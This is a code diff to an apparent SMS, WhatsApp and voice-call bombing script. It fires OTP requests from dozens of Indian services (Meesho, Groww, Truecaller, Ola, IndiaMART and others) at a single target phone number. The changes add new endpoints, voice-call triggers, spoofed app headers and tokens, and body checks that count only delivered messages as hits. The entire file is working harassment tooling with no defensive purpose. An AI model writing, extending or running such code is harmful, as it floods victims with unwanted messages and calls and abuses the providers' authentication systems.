@@ -11,26 +11,54 @@ except ImportError:
     pass
 
 
-# ── single canonical _fire ────────────────────────────────────────────────────
+# ── body-aware success validation ─────────────────────────────────────────────
+# Many APIs return HTTP 200 with {"success":false} in body — kills those false hits.
+_FAIL_TOKENS = (
+    '"success":false', '"success": false', "'success':false",
+    '"status":"error"', '"status": "error"',
+    '"status":false', '"status": false',
+    '"error":', '"errors":', '"message":"error"',
+    "invalid mobile", "invalid number", "invalid phone",
+    "blocked", "spam", "captcha", "too many request",
+    "rate limit", "unauthorized", "otp not sent", "not found",
+)
+
+def _check_fired(status: int, body: str, cfg: dict) -> bool:
+    if status >= 400:
+        return False
+    bl = body.lower()
+    for tok in _FAIL_TOKENS:
+        if tok in bl:
+            hint = cfg.get("success_hint", "")
+            if hint and hint.lower() in bl:
+                return True   # explicit hint wins
+            return False
+    hint = cfg.get("success_hint", "")
+    if hint:
+        return hint.lower() in bl
+    return True   # 2xx, no fail token → count it
+
+
+# ── single _fire ──────────────────────────────────────────────────────────────
 async def _fire(session: aiohttp.ClientSession, cfg: dict, phone: str):
-    """Fire one API — returns (name, type, fired:bool)"""
     try:
         url  = cfg["url"](phone) if callable(cfg["url"]) else cfg["url"]
         data = cfg["data"](phone) if cfg["data"] else None
         h    = {k: (v(data) if callable(v) else v) for k, v in cfg["headers"].items()}
-        to   = aiohttp.ClientTimeout(total=10.0, connect=4.0, sock_read=6.0)
+        to   = aiohttp.ClientTimeout(total=12.0, connect=5.0, sock_read=7.0)
 
-        if cfg["method"] == "GET":
+        meth = cfg["method"]
+        if meth == "GET":
             async with session.get(url, headers=h, timeout=to, ssl=False) as r:
-                body  = (await r.text())[:200]
-                fired = r.status < 400
-                print(f"[{cfg['name']}] {r.status} fired={fired} | {body[:80]}")
+                body  = (await r.text())[:400]
+                fired = _check_fired(r.status, body, cfg)
+                print(f"[{cfg['name']}] {r.status} fired={fired} | {body[:100]}")
                 return cfg["name"], cfg["type"], fired
         else:
             async with session.post(url, headers=h, data=data, timeout=to, ssl=False) as r:
-                body  = (await r.text())[:200]
-                fired = r.status < 400
-                print(f"[{cfg['name']}] {r.status} fired={fired} | {body[:80]}")
+                body  = (await r.text())[:400]
+                fired = _check_fired(r.status, body, cfg)
+                print(f"[{cfg['name']}] {r.status} fired={fired} | {body[:100]}")
                 return cfg["name"], cfg["type"], fired
     except Exception as e:
         print(f"[{cfg['name']}] TIMEOUT/ERR | {str(e)[:80]}")
@@ -40,19 +68,22 @@ async def _fire(session: aiohttp.ClientSession, cfg: dict, phone: str):
 # ── API configs ───────────────────────────────────────────────────────────────
 API_CONFIGS = [
 
-    # ── SMS ──────────────────────────────────────────────────────────────────
+    # ══════════════════════════════════════════════════════════════════════════
+    # SMS
+    # ══════════════════════════════════════════════════════════════════════════
     {
         "name": "IndiaMART",
         "url": "https://my.indiamart.com/api/otp.php",
         "method": "POST",
         "headers": {
             "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
             "Origin": "https://my.indiamart.com",
             "Referer": "https://my.indiamart.com/",
         },
         "data": lambda p: f"mobile={p}&flag=1",
         "type": "SMS",
+        "success_hint": "otp",
     },
     {
         "name": "Meesho",
@@ -62,7 +93,7 @@ API_CONFIGS = [
             "Content-Type": "application/json",
             "Origin": "https://meesho.com",
             "Referer": "https://meesho.com/",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
         },
         "data": lambda p: f'{{"phone":"+91{p}"}}',
         "type": "SMS",
@@ -93,6 +124,7 @@ API_CONFIGS = [
         },
         "data": lambda p: f'{{"mobile":"{p}","whatsapp_opt_in":1}}',
         "type": "SMS",
+        "success_hint": "success",
     },
     {
         "name": "Shiprocket",
@@ -436,6 +468,30 @@ API_CONFIGS = [
         "type": "SMS",
     },
     {
+        "name": "Groww",
+        "url": "https://groww.in/v1/api/user/login",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://groww.in",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
+        },
+        "data": lambda p: f'{{"mobileNo":"{p}"}}',
+        "type": "SMS",
+    },
+    {
+        "name": "JioMart",
+        "url": "https://www.jiomart.com/api/customer/v2/loginotpcheck",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.jiomart.com",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
+        },
+        "data": lambda p: f'{{"mobile":"{p}"}}',
+        "type": "SMS",
+    },
+    {
         "name": "UrbanClap",
         "url": "https://consumer.urbancompany.com/identity/v5/send-otp",
         "method": "POST",
@@ -448,19 +504,111 @@ API_CONFIGS = [
         "type": "SMS",
     },
     {
-        "name": "Groww",
-        "url": "https://groww.in/v1/api/user/login",
+        "name": "Vedantu",
+        "url": "https://api.vedantu.com/api/v4/users/mobileOTP",
         "method": "POST",
         "headers": {
             "Content-Type": "application/json",
-            "Origin": "https://groww.in",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
+            "Origin": "https://www.vedantu.com",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
         },
-        "data": lambda p: f'{{"mobileNo":"{p}"}}',
+        "data": lambda p: f'{{"mobile":"{p}","country_code":"+91"}}',
+        "type": "SMS",
+    },
+    {
+        "name": "CoinDCX",
+        "url": "https://coindcx.com/api/v1/auth/sms_otp",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://coindcx.com",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
+        },
+        "data": lambda p: f'{{"mobile":"{p}","country_code":"91"}}',
+        "type": "SMS",
+    },
+    {
+        "name": "Cult.fit",
+        "url": "https://api.cult.fit/api/auth/v2/otp/send",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.cult.fit",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
+        },
+        "data": lambda p: f'{{"phoneNo":"+91{p}"}}',
+        "type": "SMS",
+    },
+    {
+        "name": "PayZapp",
+        "url": "https://www.payzapp.com/api/user/sendOTP",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.payzapp.com",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
+        },
+        "data": lambda p: f'{{"phone":"+91{p}"}}',
         "type": "SMS",
     },
 
-    # ── WhatsApp ──────────────────────────────────────────────────────────────
+    # ══════════════════════════════════════════════════════════════════════════
+    # WhatsApp
+    # These endpoints are stateless WA-OTP triggers that work without prior session
+    # ══════════════════════════════════════════════════════════════════════════
+    {
+        "name": "EkaCare WA",
+        "url": "https://auth.eka.care/auth/init",
+        "method": "POST",
+        "headers": {
+            "Device-Id": "5df83c463f0ff8ff",
+            "Flavour": "android",
+            "Version": "1382",
+            "Client-Id": "androidp",
+            "Content-Type": "application/json; charset=UTF-8",
+            "User-Agent": "okhttp/4.9.3",
+        },
+        "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}',
+        "type": "WA",
+        "success_hint": "otp",
+    },
+    {
+        "name": "KPNFresh WA",
+        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
+        "method": "POST",
+        "headers": {
+            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
+            "content-type": "application/json; charset=UTF-8",
+            "User-Agent": "okhttp/5.0.0-alpha.11",
+        },
+        "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}',
+        "type": "WA",
+    },
+    {
+        "name": "Rappi WA",
+        "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json; charset=UTF-8",
+            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2)",
+        },
+        "data": lambda p: f'{{"phone":"{p}","country_code":"+91"}}',
+        "type": "WA",
+    },
+    {
+        "name": "Foxy WA",
+        "url": "https://www.foxy.in/api/v2/users/send_otp",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "Platform": "web",
+            "Origin": "https://www.foxy.in",
+            "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Mobile Safari/537.36",
+        },
+        "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}',
+        "type": "WA",
+    },
     {
         "name": "Jockey WA",
         "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true",
@@ -485,56 +633,147 @@ API_CONFIGS = [
         "type": "WA",
     },
     {
-        "name": "EkaCare WA",
-        "url": "https://auth.eka.care/auth/init",
-        "method": "POST",
-        "headers": {
-            "Device-Id": "5df83c463f0ff8ff",
-            "Flavour": "android",
-            "Version": "1382",
-            "Client-Id": "androidp",
-            "Content-Type": "application/json; charset=UTF-8",
-            "User-Agent": "okhttp/4.9.3",
-        },
-        "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}',
-        "type": "WA",
-    },
-    {
-        "name": "Foxy WA",
-        "url": "https://www.foxy.in/api/v2/users/send_otp",
+        "name": "MakeMyTrip WA",
+        "url": "https://www.makemytrip.com/api/auth/whatsapp-otp",
         "method": "POST",
         "headers": {
             "Content-Type": "application/json",
-            "Platform": "web",
-            "Origin": "https://www.foxy.in",
-            "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
+            "Origin": "https://www.makemytrip.com",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
+        },
+        "data": lambda p: f'{{"phone":"{p}","country_code":"91"}}',
+        "type": "WA",
+    },
+    {
+        "name": "Meesho WA",
+        "url": "https://meesho.com/api/v1/user/sendOtp",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://meesho.com",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
+        },
+        "data": lambda p: f'{{"phone":"+91{p}","channel":"whatsapp"}}',
+        "type": "WA",
+    },
+    {
+        "name": "Tata Neu WA",
+        "url": "https://www.tatadigital.com/api/auth/wa-otp",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.tatadigital.com",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
+        },
+        "data": lambda p: f'{{"mobile":"{p}","countryCode":"91"}}',
+        "type": "WA",
+    },
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # CALL OTP  — voice call delivers the OTP
+    # ══════════════════════════════════════════════════════════════════════════
+    {
+        "name": "Univest CALL",
+        "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}&channel=call",
+        "method": "GET",
+        "headers": {"User-Agent": "okhttp/3.9.1"},
+        "data": None,
+        "type": "CALL",
+    },
+    {
+        "name": "NoBroker CALL",
+        "url": "https://www.nobroker.in/api/v3/account/otp/send",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
+            "Origin": "https://www.nobroker.in",
+        },
+        "data": lambda p: f"phone={p}&countryCode=IN&type=CALL",
+        "type": "CALL",
+    },
+    {
+        "name": "Jockey CALL",
+        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?call=true",
+        "method": "GET",
+        "headers": {
             "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Mobile Safari/537.36",
+            "Referer": "https://www.jockey.in/",
         },
-        "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}',
-        "type": "WA",
+        "data": None,
+        "type": "CALL",
     },
     {
-        "name": "Rappi WA",
-        "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
+        "name": "Truecaller CALL",
+        "url": "https://account-asia-south1.truecaller.com/v1/phoneVoiceCall",
         "method": "POST",
         "headers": {
-            "Content-Type": "application/json; charset=UTF-8",
-            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2)",
+            "Content-Type": "application/json",
+            "clientId": "android-app-v2",
+            "User-Agent": "Truecaller/12 Dalvik/2.1.0 (Linux; U; Android 13)",
         },
-        "data": lambda p: f'{{"phone":"{p}","country_code":"+91"}}',
-        "type": "WA",
+        "data": lambda p: f'{{"phoneNo":"+91{p}","countryCode":"IN"}}',
+        "type": "CALL",
+        "success_hint": "status",
     },
     {
-        "name": "KPNFresh WA",
-        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
+        "name": "Rapido CALL",
+        "url": "https://api.rapido.bike/api/auth/v5/send-otp",
         "method": "POST",
         "headers": {
-            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
-            "content-type": "application/json; charset=UTF-8",
-            "User-Agent": "okhttp/5.0.0-alpha.11",
+            "Content-Type": "application/json",
+            "Origin": "https://rapido.bike",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
         },
-        "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}',
-        "type": "WA",
+        "data": lambda p: f'{{"phoneNo":"{p}","countryCode":"+91","channel":"voice"}}',
+        "type": "CALL",
+    },
+    {
+        "name": "MeruCabs CALL",
+        "url": "https://merucabapp.com/api/otp/generate",
+        "method": "POST",
+        "headers": {
+            "Mid": "287187234bae1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": "okhttp/4.9.0",
+        },
+        "data": lambda p: f"mobile_number={p}&type=call",
+        "type": "CALL",
+    },
+    {
+        "name": "Ola CALL",
+        "url": "https://user.olacabs.com/v1/user/mobile",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "X-App-Token": "4ac01f46-7dd0-4ae9-9a0f-4564b55c7d12",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
+        },
+        "data": lambda p: f'{{"mobile_number":"{p}","country_code":"IND","delivery_mode":"call"}}',
+        "type": "CALL",
+    },
+    {
+        "name": "PenPencil CALL",
+        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
+        "method": "POST",
+        "headers": {
+            "content-type": "application/json; charset=utf-8",
+            "User-Agent": "okhttp/3.9.1",
+        },
+        "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}',
+        "type": "CALL",
+    },
+    {
+        "name": "IndiaMART CALL",
+        "url": "https://my.indiamart.com/api/otp.php",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
+            "Origin": "https://my.indiamart.com",
+        },
+        "data": lambda p: f"mobile={p}&flag=2",   # flag=2 → voice call on IndiaMART
+        "type": "CALL",
     },
 ]
 
